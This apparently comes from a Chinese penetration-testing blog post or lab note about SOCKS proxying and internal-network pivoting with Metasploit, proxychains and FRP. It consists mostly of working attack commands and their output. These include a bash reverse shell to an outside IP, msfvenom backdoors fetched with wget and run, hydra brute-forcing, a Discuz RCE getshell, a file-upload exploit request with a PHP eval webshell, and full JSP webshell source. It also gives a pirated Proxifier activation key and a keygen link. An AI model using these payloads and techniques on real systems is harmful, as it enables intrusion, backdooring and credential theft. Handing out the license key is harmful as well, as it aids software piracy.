href="http://proxychains.sourceforge.net/">http://proxychains.sourceforge.net/</a></p></blockquote><p>关于ProxyChains工具：</p><ul><li>它是一个代理工具。</li><li>最新版本：3.1</li><li>专用OS：Linux和其他Unices。</li><li>允许TCP和DNS通过代理隧道。</li><li>支持HTTP、SOCKS4和SOCKS5代理服务器。</li><li>不同的代理类型可以混合在同一链中。</li><li>代理链：用户定义的代理链列表。</li></ul><p>可用性：</p><ul><li>通过代理服务器运行任何程序。</li><li>从限制性防火墙后面访问互联网。</li><li>隐藏你的IP</li><li>通过代理服务器运行SSH、telnet、wget、ftp、apt、vnc、nmap。</li><li>从外部通过反向代理访问内联网(192.168..&#x2F;10..)。</li></ul><h3 id="Proxifier（老师用的多）"><a href="#Proxifier（老师用的多）" class="headerlink" title="Proxifier（老师用的多）"></a>Proxifier（老师用的多）</h3><blockquote><ul><li><p><a href="https://www.proxifier.com/">https://www.proxifier.com/</a></p></li><li><p><a href="https://www.cnblogs.com/nul1/p/13952992.html">Proxifier使用教程 </a></p></li><li><p>激活</p></li></ul><blockquote><p>mac v3激活码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3CWNN-WYTP4-SD83W-ASDFR-84KEA</span><br></pre></td></tr></table></figure><p>windows 激活码生成工具：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Danz17/Proxifier-Keygen</span><br></pre></td></tr></table></figure></blockquote></blockquote><h3 id="Others"><a href="#Others" class="headerlink" title="-Others"></a>-Others</h3><blockquote><ul><li><p>reDuh：<a href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a></p></li><li><p>reGeorg（RGP）：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p></li><li><p>sSocks：<a href="https://sourceforge.net/projects/ssocks/">https://sourceforge.net/projects/ssocks/</a></p></li><li><p>SocksCap64（Windows）：<a href="http://www.sockscap64.com/">http://www.sockscap64.com</a></p></li></ul></blockquote><h1 id="Socks代理实战一-MSF"><a href="#Socks代理实战一-MSF" class="headerlink" title="Socks代理实战一(MSF)"></a>Socks代理实战一(MSF)</h1><p>使用已经msf搭建好的socks代理模块</p><p>注意msf使用socks5代理不稳定！</p><p>原理讲解：其他具体操作往下看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先我们的目标是proxychains curl http://192.168.2.242，访问192.168.2.242数据包，通过proxychains代理了这个请求！那我们代理服务器在哪呢？————在配置文件中配置的VPS ip+端口</span><br><span class="line">由于我是在VPS上的msf开启了socks5代理，所以ip填本地127.0.0.1，端口填1080</span><br><span class="line">也就是修改proxychains配置文件，设定其走的代理:</span><br><span class="line">        vim /etc/proxychains.conf</span><br><span class="line">        注释掉socks4那一行，加上：</span><br><span class="line">        socks5 127.0.0.1 1080</span><br><span class="line">2、数据通过proxychains走到了我们msf开启的socks5代理，那么socks5该怎么配置，才能让其访问到内网的主机呢！？这也是灵魂所在 socks5代理端 怎么配置</span><br><span class="line">数据包通过1080端口到了我们的msf socks 此时它该何去何从？</span><br><span class="line">需要先了解什么是路由：</span><br><span class="line">“路由是指路由器从一个接口上收到数据包，根据数据包的目的地址进行定向并转发到另一个接口的过程。”</span><br><span class="line">我们需要先配置msf的路由，这样子 数据包才会知道该往哪里转发</span><br><span class="line">3、msf路由怎么配置呢？</span><br><span class="line">可以在session2 我们拿到的目标内网第一台外网target1的meterpreter里面执行(当然了也可以在msf中执行添加路由的操作)：</span><br><span class="line">run autoroute -s 192.168.2.0/24    </span><br><span class="line">添加 192.168.2  网段的路由</span><br><span class="line">run autoroute -p    </span><br><span class="line">查看添加的路由</span><br><span class="line">Active Routing Table====================   </span><br><span class="line">Subnet             Netmask            Gateway   ------             -------            -------   </span><br><span class="line">192.168.2.0        255.255.255.0      Session 2</span><br><span class="line">默认的在这个路由表中，只会有10.30.1.255的路由，我们手动添加了192.168.2.0的路由（目标机器两个网卡）我们可以看到在子网192.168.2.0的数据会从网关session 2转发处理，这也是一系列的关键所在。</span><br><span class="line">将信息添加到路由后，数据到达msf socks服务器之后，查询路由表，就会知道往网关session 2转发数据包</span><br><span class="line">4、数据到达session 2后，也急速通过我们的shell meterpreter发送往target1。到了target1该如何走呢？</span><br><span class="line">通过target 1当作一个路由器，将我们的数据转发到target 2，原本上target 1与target 2就是通的。</span><br><span class="line">在物理层，会根据路由向对应mac地址的机器发送数据</span><br></pre></td></tr></table></figure><p>附：另一种run autoroute命令 添加msf路由方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看shell网络环境：</span><br><span class="line">meterpreter&gt;run get_local_subnets</span><br><span class="line">添加一条通向目标服务器内网的路由</span><br><span class="line">meterpreter&gt;run autoroute -s 100.0.0.0/8   #(根据目标内网网络而定)</span><br><span class="line">查看路由设置：</span><br><span class="line">meterpreter&gt;run autoroute –p</span><br><span class="line">一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf&gt;，查看下外面的路由情况。</span><br><span class="line">route print</span><br><span class="line">如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。</span><br><span class="line">msf&gt;route add 10.0.0.0 255.0.0.0 1</span><br><span class="line">说明：1表示session 1，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</span><br></pre></td></tr></table></figure><h2 id="渗透场景介绍"><a href="#渗透场景介绍" class="headerlink" title="渗透场景介绍"></a>渗透场景介绍</h2><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210200297.png" alt="image-20220921020045065"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先碰到一个网站 要去思考怎么入侵</p><p>收集到信息</p><p>从web类漏洞：xss、sql注入、文件上传、代码执行、逻辑漏洞、反序列化等等等</p><p>从中间件漏洞</p><p>从源码漏洞</p><p>从系统层漏洞</p><p>从数据库漏洞</p><p>从哪方面入手，要尝试，要积累经验，要思考</p><p>比如说 <a href="http://218.76.8.99:38080/">http://218.76.8.99:38080/</a>这台机器就是一个apache tomcat 8.5.0的版本，可以去搜索有没有历史漏洞</p><p>前提还是要收集够足够多的信息</p><h3 id="探测敏感目录"><a href="#探测敏感目录" class="headerlink" title="-探测敏感目录"></a>-探测敏感目录</h3><p>扫描后发现如下路径和文件可以访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://218.76.8.99:38080/</span><br><span class="line">---- Scanning URL: http://218.76.8.99:38080/ ----</span><br><span class="line">+ http://218.76.8.99:38080/docs (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/examples (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/favicon.ico (CODE:200|SIZE:21630)</span><br><span class="line">+ http://218.76.8.99:38080/host-manager (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/manager (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/sh (CODE:302|SIZE:0)</span><br></pre></td></tr></table></figure><h3 id="页面分析"><a href="#页面分析" class="headerlink" title="-页面分析"></a>-页面分析</h3><blockquote><p><a href="http://218.76.8.99:38080/sh/">http://218.76.8.99:38080/sh/</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210201431.png" alt="image-20220921020154228"></p><p>发现 apache shiro组件，得到默认页面，判断shiro是否能利用</p><p>并得到key： kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210202963.png" alt="image-20220921020205748"></p><blockquote><p><a href="https://github.com/fupinglee/ShiroScan/releases">https://github.com/fupinglee/ShiroScan/releases</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210202233.png" alt="image-20220921020231017"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210245769.png" alt="image-20220921020236023"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p><p>这个工具简便操作直接反弹shell好像有点问题，建议还是手动输入反弹shell的命令，后来试了，都可以拿到shell</p></blockquote><ul><li>执行命令</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210203954.png" alt="image-20220921020335774"></p><ul><li>反弹shell</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/124.223.217.243/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure><ul><li>msfvenom 生成linux后门</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse\_tcp lhost=124.223.217.243 lport=6666 -f elf -o re\_1818.elf</span><br></pre></td></tr></table></figure><ul><li>MSF开启监听</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p linux/x64/meterpreter/reverse\_tcp -H 124.223.217.243 -P 6666</span><br></pre></td></tr></table></figure><ul><li>远程下载执行上线MSF</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server wget -P /tmp &lt;http://124.223.217.243:8000/re_6666.elf&gt; chmod +x /tmp/re\_6666.elf ./re\_6666.elf sessions查看会话</span><br></pre></td></tr></table></figure><h2 id="渗透Target1"><a href="#渗透Target1" class="headerlink" title="渗透Target1"></a>渗透Target1</h2><ul><li>主机信息收集</li></ul><p>前面拿到了老师主机的shell，反弹回来的，然后拿到了meterpreter</p><p>ifconfig：发现存在 192.168.2.0&#x2F;24 的内网网段。inet模仿的就是机器公网ip，192.168.2.151模仿的就是我们拿到的内网ip，在2网段，据此我们继续收集信息，发起攻击</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210204872.png" alt="image-20220921020421699"></p><p>msf拿到的shell不好看，我们可以通过python美化一点，得到一个和本地执行一样更加真实的终端</p><p>python pty 模块得到 pty 终端</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -V 先查看是否有python</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>探测此网段存活主机：可以通过脚本，也可以通过fscan扫内网</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.sh</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 254);<span class="keyword">do</span> ping -c 1 192.168.81.<span class="variable">$num</span>|grep <span class="string">&quot;ttl&quot;</span>|awk -F <span class="string">&quot;[ :]&quot;</span> <span class="string">&#x27;&#123;print $4&#125;&#x27;</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -P /tmp http://124.71.45.28:8000/1.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要使用fscan可能要先上传fscan，wget获取，msf 有upload功能        </span><br><span class="line">./fscan -h 192.168.2.0/24</span><br><span class="line">fscan扫内网很方便，扫描的快</span><br><span class="line"></span><br><span class="line">(icmp) Target &#x27;192.168.2.151&#x27; is alive</span><br><span class="line">(icmp) Target &#x27;192.168.2.1&#x27; is alive</span><br><span class="line">(icmp) Target &#x27;192.168.2.242&#x27; is alive</span><br><span class="line">192.168.2.242:445 open</span><br><span class="line">192.168.2.242:139 open</span><br><span class="line">192.168.2.242:135 open</span><br><span class="line">192.168.2.242:21 open</span><br><span class="line">192.168.2.242:80 open</span><br><span class="line"></span><br><span class="line">192.168.2.242:3306 open</span><br><span class="line"></span><br><span class="line">192.168.2.242:10000 open</span><br><span class="line">start vulscan</span><br><span class="line">NetInfo:</span><br><span class="line">[*]192.168.2.242</span><br><span class="line">   [-&gt;]metinfo-xss</span><br><span class="line">   [-&gt;]192.168.2.242</span><br><span class="line">   [-&gt;]192.168.3.190</span><br><span class="line"></span><br><span class="line">[*] 192.168.2.242        __MSBROWSE__\METINFO-XSS       Windows 7 Professional 7601 Service Pack 1</span><br><span class="line">[+] 192.168.2.242       MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[+] SSH:192.168.2.151:22:root root</span><br></pre></td></tr></table></figure><p>发现存活主机 192.168.2.242 ，并开放web服务，存在Discuz服务。</p><h2 id="渗透Target2"><a href="#渗透Target2" class="headerlink" title="渗透Target2"></a>渗透Target2</h2><h3 id="获得target1的shell后，添加到-192-168-2-网段的路由"><a href="#获得target1的shell后，添加到-192-168-2-网段的路由" class="headerlink" title="-获得target1的shell后，添加到 192.168.2 网段的路由"></a>-获得target1的shell后，添加到 192.168.2 网段的路由</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在目标target1上的meterpreter上执行</span><br><span class="line">run autoroute -s 192.168.2.0/24    添加到 192.168.2  网段的路由</span><br><span class="line">run autoroute -p    查看添加的路由</span><br></pre></td></tr></table></figure><h3 id="使用-MSF-的-socks5-模块建立-socks-代理服务（使用msf会很简单）"><a href="#使用-MSF-的-socks5-模块建立-socks-代理服务（使用msf会很简单）" class="headerlink" title="-使用 MSF 的 socks5 模块建立 socks 代理服务（使用msf会很简单）"></a>-使用 MSF 的 socks5 模块建立 socks 代理服务（使用msf会很简单）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search socks</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options    0.0.0.0表示任何人可上此代理，1080是连接socks代理的端口</span><br><span class="line">    SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be</span><br><span class="line">                                        an address on the local machine or 0.0.0.0 to listen on all add</span><br><span class="line">                                        resses.</span><br><span class="line">   SRVPORT   1080             yes       The port to listen on</span><br><span class="line"> </span><br><span class="line">exploit –j     后台执行</span><br><span class="line">jobs查看</span><br><span class="line"></span><br><span class="line">开启的socks代理流量，不管是本地的127.0.0.1还是外部我windows都可以走此通道</span><br><span class="line">msf搭建的就是一个socks代理服务器</span><br><span class="line">接下来通过proxychains验证socks代理是否有用</span><br><span class="line">我们可以通过netstat -anlp|grep 1080 查看1080端口状态 是否在监听</span><br></pre></td></tr></table></figure><h3 id="配置proxychains代理"><a href="#配置proxychains代理" class="headerlink" title="-配置proxychains代理"></a>-配置proxychains代理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VPS</span><br><span class="line">apt install proxychains</span><br><span class="line">修改配置 使我们的数据走我们代理</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">注释掉socks4那一行，加上：</span><br><span class="line">socks5 127.0.0.1 1080</span><br><span class="line">proxychains就是让我们执行的操作，走我们配置的代理服务器也就是本地的1080端口</span><br></pre></td></tr></table></figure><h3 id="检验测试"><a href="#检验测试" class="headerlink" title="-检验测试"></a>-检验测试</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">之前对内网信息收集 发现了192.168.2.242开启了http服务，进行测试</span><br><span class="line">proxychains curl http://192.168.2.242</span><br><span class="line">root@VM-16-6-ubuntu:~/tools# proxychains curl http://192.168.2.242</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="代理namp扫描内网"><a href="#代理namp扫描内网" class="headerlink" title="-代理namp扫描内网"></a>-代理namp扫描内网</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自此就可以通过proxchains代理访问内网的192.168.2.242机器，对其</span><br><span class="line">proxychains nmap -sT -Pn -n -T4 192.168.2.242</span><br><span class="line">另外需要注意一定要使用-Pn，不能使用ping，因为我们的socks是会话层协议，不支持ICMP协议，不支持ping</span><br><span class="line">开放端口：21/80/135/139/445/3306/3389</span><br><span class="line">操作系统：windows</span><br><span class="line">Nmap scan report for 192.168.2.242</span><br><span class="line">Host is up (0.026s latency).</span><br><span class="line">Not shown: 986 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">1025/tcp  open  NFS-or-IIS</span><br><span class="line">1026/tcp  open  LSA-or-nterm</span><br><span class="line">1027/tcp  open  IIS</span><br><span class="line">1031/tcp  open  iad2</span><br><span class="line">1047/tcp  open  neod1</span><br><span class="line">1049/tcp  open  td-postman</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">10000/tcp open  snet-sensor-mgmt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分析利用"><a href="#分析利用" class="headerlink" title="-分析利用"></a>-分析利用</h3><p>21 &#x2F; 3306 端口：弱口令爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains hydra -vV -l root -P /usr/share/wordlists/metasploit/password.lst 192.168.2.242 ftp</span><br><span class="line">proxychains hydra -vV -l root -P /usr/share/wordlists/metasploit/password.lst 192.168.2.242 mysql</span><br></pre></td></tr></table></figure><p>80端口：discuz（cnvd-2019-22239）</p><blockquote><p><a href="https://github.com/theLSA/discuz-ml-rce">https://github.com/theLSA/discuz-ml-rce</a>使用脚本快速getshell</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将脚本下载到本地</span><br><span class="line">pip install -r requirements.txt安装依赖</span><br><span class="line">proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php        检测是否可利用</span><br><span class="line">proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php --getshell        在网站根目录写入x.php</span><br><span class="line"></span><br><span class="line">执行结果</span><br><span class="line">root@VM-16-6-ubuntu:~/tools/discuz-ml-rce# proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|DNS-request| ::1 </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response|: ::1 does not exist</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">target is vulnerable!!!</span><br><span class="line">root@VM-16-6-ubuntu:~/tools/discuz-ml-rce# proxychains python2 dz-ml-rce.py -u http://192.168.2.242/forum.php --getshell</span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|DNS-request| ::1 </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response|: ::1 does not exist</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-192.168.2.242:80-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">Getshell success!-shellPath:http://192.168.2.242/x.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配置socks代理连接shell"><a href="#配置socks代理连接shell" class="headerlink" title="-配置socks代理连接shell"></a>-配置socks代理连接shell</h3><p>先配置socks代理，再连内网，记得保存生效</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210207597.png" alt="image-20220921020747432"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210207044.png" alt="image-20220921020755811"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210208307.png" alt="image-20220921020804093"></p><h2 id="渗透Target3"><a href="#渗透Target3" class="headerlink" title="渗透Target3"></a>渗透Target3</h2><p>我们如果需要拿到target3的shell需要先建立前往target3的路由，需要先拿到target2的meterpreter，当数据包到了之后，通过路由得知target 192.168.3.0网段的数据包要往target2的meterpreter session转发！</p><h3 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="-探测存活主机"></a>-探测存活主机</h3><p>ipconfig：发现存在 192.168.3.0&#x2F;24 的内网网段。</p><p>探测此网段存活主机：发现存活主机 192.168.3.180</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.3.0/24 &gt; 123.txt</span><br><span class="line"><span class="built_in">type</span> 123.txt</span><br><span class="line">+] 192.168.3.190    MS17-010    (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8983 code:302 len:0      title:None</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8888 code:302 len:219    title:Redirecting...</span><br><span class="line">[*] WebTitle:http://192.168.3.180:888  code:403 len:548    title:403 Forbidden</span><br><span class="line">[*] WebTitle:http://192.168.3.180      code:302 len:0      title:None</span><br><span class="line">[*] 192.168.3.190        __MSBROWSE__\METINFO-XSS       Windows 7 Professional 7601 Service Pack 1</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8983/solr/ code:200 len:14470  title:Solr Admin</span><br><span class="line">[*] WebTitle:http://192.168.3.180:8888/login code:200 len:24     title:安全入口校验失败</span><br><span class="line">[*] WebTitle:http://192.168.3.180/seller.php?s=/Public/login code:200 len:27     title:登录 - 商家管理系统</span><br><span class="line">[+] InfoScan:http://192.168.3.180:8888/login [宝塔-BT.cn] </span><br><span class="line">[*] WebTitle:http://192.168.3.190      code:200 len:23     title:-  Powered by Discuz!</span><br><span class="line">[+] http://192.168.3.180:8983 poc-yaml-solr-cve-2019-0193</span><br><span class="line">[+] http://192.168.3.190 poc-yaml-discuz-ml3x-cnvd-2019-22239</span><br><span class="line">[+] http://192.168.3.190 poc-yaml-phpstudy-backdoor-rce</span><br><span class="line">[+] SSH:192.168.3.180:22:root root</span><br></pre></td></tr></table></figure><h3 id="获取Target2的shell"><a href="#获取Target2的shell" class="headerlink" title="-获取Target2的shell"></a>-获取Target2的shell</h3><p>现在有两种思路拿到在内网种target2的shell，</p><p>其一是层层设置代理转发流量出网，最终到我们的VPS；其二便是接下来msf直接获取的方法</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210208921.png" alt="image-20220921020857687"></p><p>注意这个地方不能直接反弹shell，内网的target2并不能访问公网，所以不能通过reverse_tcp建立连接，不能反弹shell，反向的shell连接不到主机！</p><p>所以我们要使用正向shell 还需要注意的是，我们公网VPS通过代理可以访问内网target2，但是呢target2并不可以出网！！！</p><ul><li>msfvenom 生成正向连接 payload</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind\_tcp lport=7878 -f exe -o bind7878.exe</span><br></pre></td></tr></table></figure><ul><li>上传到 target2 并执行</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start bind7878.exe</span><br></pre></td></tr></table></figure><ul><li>MSF添加正向连接监听器</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p windows/x64/meterpreter/bind\_tcp -H 192.168.2.242 -P 7878</span><br></pre></td></tr></table></figure><p>反弹回 target2 的 meterpreter shell</p><h3 id="添加到33网段的路由"><a href="#添加到33网段的路由" class="headerlink" title="-添加到33网段的路由"></a>-添加到33网段的路由</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -s 192.168.3.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line">这样子才会将数据转发到target2的meterpreter </span><br></pre></td></tr></table></figure><h3 id="代理nmap扫描Target3"><a href="#代理nmap扫描Target3" class="headerlink" title="-代理nmap扫描Target3"></a>-代理nmap扫描Target3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Proxychains nmap –sT –Pn –n –T4 192.168.3.180</span><br><span class="line">开放端口：21/22/80/135/139/445/8888</span><br><span class="line">操作系统：linux</span><br></pre></td></tr></table></figure><p>80端口：狮子鱼cms</p><h3 id="狮子鱼cms任意文件上传拿shell"><a href="#狮子鱼cms任意文件上传拿shell" class="headerlink" title="-狮子鱼cms任意文件上传拿shell"></a>-狮子鱼cms任意文件上传拿shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exp</span><br><span class="line"></span><br><span class="line">POST </span><br><span class="line">/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php </span><br><span class="line">HTTP/1.1</span><br><span class="line">Host: 192.168.3.180</span><br><span class="line">Content-Type: multipart/form-data; boundary=----</span><br><span class="line">WebKitFormBoundary8UaANmWAgM4BqBSs</span><br><span class="line">Content-Length: 204</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Connection: close</span><br><span class="line">------WebKitFormBoundary8UaANmWAgM4BqBSs</span><br><span class="line">Content-Disposition: form-data; name=&quot;files&quot;; </span><br><span class="line">filename=&quot;mm.php&quot;</span><br><span class="line">Content-Type: image/gif</span><br><span class="line">&lt;?php eval($_POST[&#x27;pwd&#x27;]);?&gt;</span><br><span class="line">------WebKitFormBoundary8UaANmWAgM4BqBSs</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210210599.png" alt="image-20220921021014377"></p><blockquote><p><a href="http://192.168.3.180/Common/image/uploads/1652168710238.php">http://192.168.3.180/Common/image/uploads/1652168710238.php</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210235766.png" alt="image-20220921021039518"></p><h1 id="Socks代理实战二-FRP"><a href="#Socks代理实战二-FRP" class="headerlink" title="Socks代理实战二(FRP)"></a>Socks代理实战二(FRP)</h1><p>代理工具 搭建较好用的代理通道</p><blockquote><p><a href="https://gofrp.org/docs/examples/vhost-http/">https://gofrp.org/docs/examples/vhost-http/</a>文档</p></blockquote><h2 id="渗透Target1-1"><a href="#渗透Target1-1" class="headerlink" title="渗透Target1"></a>渗透Target1</h2><p>我们已经通过shiro拿到shiro的shell，我们进一步拿到反弹shell，拿到一个可执行命令的shell</p><h3 id="拿反弹shell方法一：远程下载-webshell（冰蝎的）到网站目录"><a href="#拿反弹shell方法一：远程下载-webshell（冰蝎的）到网站目录" class="headerlink" title="-拿反弹shell方法一：远程下载 webshell（冰蝎的）到网站目录"></a>-拿反弹shell方法一：远程下载 webshell（冰蝎的）到网站目录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br><span class="line">cd /usr/tomcat/apache-tomcat-8.5.0/webapps/sh</span><br><span class="line">wget http://124.223.217.243:8000/9999.jsp</span><br></pre></td></tr></table></figure><p>冰蝎：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210236736.png" alt="image-20220921023618509"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210236830.png" alt="image-20220921023622619"></p><p>蚁剑shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) </span><br><span class="line">decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><ul><li>2.内存 shell</li></ul><blockquote><p><a href="https://github.com/fupinglee/ShiroScan/releases">https://github.com/fupinglee/ShiroScan/releases</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210236936.png" alt="image-20220921023649681"></p><p>注入内存马 ，注入之后即可连接</p><figure class="highlight 